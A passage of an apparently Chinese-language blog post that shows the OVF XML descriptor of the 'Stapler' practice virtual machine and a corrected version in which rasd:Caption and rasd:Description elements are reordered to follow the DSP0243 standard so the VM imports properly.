class="name">rasd:AddressOnParent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:AutomaticAllocation</span>&gt;</span>true<span class="tag">&lt;/<span class="name">rasd:AutomaticAllocation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Connection</span>&gt;</span>hostonly<span class="tag">&lt;/<span class="name">rasd:Connection</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Description</span>&gt;</span>PCNet32 ethernet adapter on <span class="symbol">&amp;quot;</span>hostonly<span class="symbol">&amp;quot;</span><span class="tag">&lt;/<span class="name">rasd:Description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>ethernet0<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>6<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceSubType</span>&gt;</span>PCNet32<span class="tag">&lt;/<span class="name">rasd:ResourceSubType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>10<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;slotInfo.pciSlotNumber&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;33&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;wakeOnLanEnabled&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:AutomaticAllocation</span>&gt;</span>false<span class="tag">&lt;/<span class="name">rasd:AutomaticAllocation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>video<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>7<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>24<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;enable3DSupport&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;slotInfo.pciSlotNumber&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;33&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:AutomaticAllocation</span>&gt;</span>false<span class="tag">&lt;/<span class="name">rasd:AutomaticAllocation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>vmci<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>8<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceSubType</span>&gt;</span>vmware.vmci<span class="tag">&lt;/<span class="name">rasd:ResourceSubType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>1<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;slotInfo.pciSlotNumber&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;33&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:AddressOnParent</span>&gt;</span>0<span class="tag">&lt;/<span class="name">rasd:AddressOnParent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>disk0<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:HostResource</span>&gt;</span>ovf:/disk/vmdisk1<span class="tag">&lt;/<span class="name">rasd:HostResource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>9<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Parent</span>&gt;</span>3<span class="tag">&lt;/<span class="name">rasd:Parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>17<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;slotInfo.pciSlotNumber&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;33&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:AddressOnParent</span>&gt;</span>1<span class="tag">&lt;/<span class="name">rasd:AddressOnParent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:AutomaticAllocation</span>&gt;</span>false<span class="tag">&lt;/<span class="name">rasd:AutomaticAllocation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>cdrom0<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>10<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Parent</span>&gt;</span>3<span class="tag">&lt;/<span class="name">rasd:Parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>15<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;slotInfo.pciSlotNumber&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;33&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;cpuHotAddEnabled&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;memoryHotAddEnabled&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;powerOpInfo.powerOffType&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;soft&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;powerOpInfo.resetType&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;soft&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;powerOpInfo.suspendType&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;soft&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;tools.afterPowerOn&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;tools.afterResume&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;tools.beforeGuestShutdown&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;tools.beforeGuestStandby&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;tools.syncTimeWithHost&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;tools.toolsUpgradePolicy&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;upgradeAtPowerCycle&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">VirtualHardwareSection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">AnnotationSection</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Info</span>&gt;</span>A human-readable annotation<span class="tag">&lt;/<span class="name">Info</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Annotation</span>&gt;</span>--[[~~Enjoy. Have fun. Happy Hacking.~~]]--</span><br><span class="line"></span><br><span class="line">+ There are multiple methods to-do this machine: At least</span><br><span class="line">-- Two (2) paths to get a limited shell</span><br><span class="line">-- At least three (3) ways to get a root access<span class="tag">&lt;/<span class="name">Annotation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">AnnotationSection</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">VirtualSystem</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="修复验证"><a href="#修复验证" class="headerlink" title="修复验证"></a>修复验证</h2><p>根据 DSP0243 标准文档中的规则，主要调整了 <code>&lt;rasd:Caption&gt;</code> 元素与 <code>&lt;rasd:Description&gt;</code> 元素的顺序，将 <code>Stapler.ovf</code> 文件恢复为正确排列格式：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Generated by VMware ovftool 4.1.0 (build-3018522), UTC time: 2016-06-07T10:02:55.518806Z--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Envelope</span> <span class="attr">vmw:buildId</span>=<span class="string">&quot;build-3018522&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.dmtf.org/ovf/envelope/1&quot;</span> <span class="attr">xmlns:cim</span>=<span class="string">&quot;http://schemas.dmtf.org/wbem/wscim/1/common&quot;</span> <span class="attr">xmlns:ovf</span>=<span class="string">&quot;http://schemas.dmtf.org/ovf/envelope/1&quot;</span> <span class="attr">xmlns:rasd</span>=<span class="string">&quot;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_ResourceAllocationSettingData&quot;</span> <span class="attr">xmlns:vmw</span>=<span class="string">&quot;http://www.vmware.com/schema/ovf&quot;</span> <span class="attr">xmlns:vssd</span>=<span class="string">&quot;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_VirtualSystemSettingData&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">References</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">File</span> <span class="attr">ovf:href</span>=<span class="string">&quot;Stapler-disk1.vmdk&quot;</span> <span class="attr">ovf:id</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">ovf:size</span>=<span class="string">&quot;757926912&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">References</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">DiskSection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Info</span>&gt;</span>Virtual disk information<span class="tag">&lt;/<span class="name">Info</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Disk</span> <span class="attr">ovf:capacity</span>=<span class="string">&quot;20&quot;</span> <span class="attr">ovf:capacityAllocationUnits</span>=<span class="string">&quot;byte * 2^30&quot;</span> <span class="attr">ovf:diskId</span>=<span class="string">&quot;vmdisk1&quot;</span> <span class="attr">ovf:fileRef</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">ovf:format</span>=<span class="string">&quot;http://www.vmware.com/interfaces/specifications/vmdk.html#streamOptimized&quot;</span> <span class="attr">ovf:populatedSize</span>=<span class="string">&quot;2212560896&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">DiskSection</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">NetworkSection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Info</span>&gt;</span>The list of logical networks<span class="tag">&lt;/<span class="name">Info</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Network</span> <span class="attr">ovf:name</span>=<span class="string">&quot;hostonly&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Description</span>&gt;</span>The hostonly network<span class="tag">&lt;/<span class="name">Description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Network</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">NetworkSection</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">VirtualSystem</span> <span class="attr">ovf:id</span>=<span class="string">&quot;vm&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Info</span>&gt;</span>A virtual machine<span class="tag">&lt;/<span class="name">Info</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Name</span>&gt;</span>Stapler<span class="tag">&lt;/<span class="name">Name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">OperatingSystemSection</span> <span class="attr">ovf:id</span>=<span class="string">&quot;93&quot;</span> <span class="attr">vmw:osType</span>=<span class="string">&quot;ubuntuGuest&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Info</span>&gt;</span>The kind of installed guest operating system<span class="tag">&lt;/<span class="name">Info</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">OperatingSystemSection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">VirtualHardwareSection</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Info</span>&gt;</span>Virtual hardware requirements<span class="tag">&lt;/<span class="name">Info</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">System</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vssd:Caption</span>&gt;</span>Virtual Hardware Family<span class="tag">&lt;/<span class="name">vssd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vssd:InstanceID</span>&gt;</span>0<span class="tag">&lt;/<span class="name">vssd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vssd:VirtualSystemIdentifier</span>&gt;</span>Stapler<span class="tag">&lt;/<span class="name">vssd:VirtualSystemIdentifier</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vssd:VirtualSystemType</span>&gt;</span>vmx-15<span class="tag">&lt;/<span class="name">vssd:VirtualSystemType</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">System</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:AllocationUnits</span>&gt;</span>hertz * 10^6<span class="tag">&lt;/<span class="name">rasd:AllocationUnits</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>1 virtual CPU(s)<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Description</span>&gt;</span>Number of Virtual CPUs<span class="tag">&lt;/<span class="name">rasd:Description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>1<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>3<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:VirtualQuantity</span>&gt;</span>1<span class="tag">&lt;/<span class="name">rasd:VirtualQuantity</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:AllocationUnits</span>&gt;</span>byte * 2^20<span class="tag">&lt;/<span class="name">rasd:AllocationUnits</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>1024MB of memory<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Description</span>&gt;</span>Memory Size<span class="tag">&lt;/<span class="name">rasd:Description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>2<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>4<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:VirtualQuantity</span>&gt;</span>1024<span class="tag">&lt;/<span class="name">rasd:VirtualQuantity</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Address</span>&gt;</span>0<span class="tag">&lt;/<span class="name">rasd:Address</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>sataController0<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Description</span>&gt;</span>SATA Controller<span class="tag">&lt;/<span class="name">rasd:Description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>3<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceSubType</span>&gt;</span>AHCI<span class="tag">&lt;/<span class="name">rasd:ResourceSubType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>20<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Address</span>&gt;</span>0<span class="tag">&lt;/<span class="name">rasd:Address</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>usb<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Description</span>&gt;</span>USB Controller (EHCI)<span class="tag">&lt;/<span class="name">rasd:Description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>4<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceSubType</span>&gt;</span>vmware.usb.ehci<span class="tag">&lt;/<span class="name">rasd:ResourceSubType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>23<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;ehciEnabled&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Address</span>&gt;</span>0<span class="tag">&lt;/<span class="name">rasd:Address</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>scsiController0<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Description</span>&gt;</span>SCSI Controller<span class="tag">&lt;/<span class="name">rasd:Description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>5<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceSubType</span>&gt;</span>lsilogic<span class="tag">&lt;/<span class="name">rasd:ResourceSubType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>6<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:AddressOnParent</span>&gt;</span>2<span class="tag">&lt;/<span class="name">rasd:AddressOnParent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:AutomaticAllocation</span>&gt;</span>true<span class="tag">&lt;/<span class="name">rasd:AutomaticAllocation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>ethernet0<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Connection</span>&gt;</span>hostonly<span class="tag">&lt;/<span class="name">rasd:Connection</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Description</span>&gt;</span>PCNet32 ethernet adapter on <span class="symbol">&amp;quot;</span>hostonly<span class="symbol">&amp;quot;</span><span class="tag">&lt;/<span class="name">rasd:Description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>6<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceSubType</span>&gt;</span>PCNet32<span class="tag">&lt;/<span class="name">rasd:ResourceSubType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>10<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;slotInfo.pciSlotNumber&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;33&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;wakeOnLanEnabled&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:AutomaticAllocation</span>&gt;</span>false<span class="tag">&lt;/<span class="name">rasd:AutomaticAllocation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>video<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>7<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>24<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;enable3DSupport&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;slotInfo.pciSlotNumber&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;33&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:AutomaticAllocation</span>&gt;</span>false<span class="tag">&lt;/<span class="name">rasd:AutomaticAllocation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>vmci<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>8<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceSubType</span>&gt;</span>vmware.vmci<span class="tag">&lt;/<span class="name">rasd:ResourceSubType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>1<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;slotInfo.pciSlotNumber&quot;</span> <span class="attr">vmw:value</span>=<span 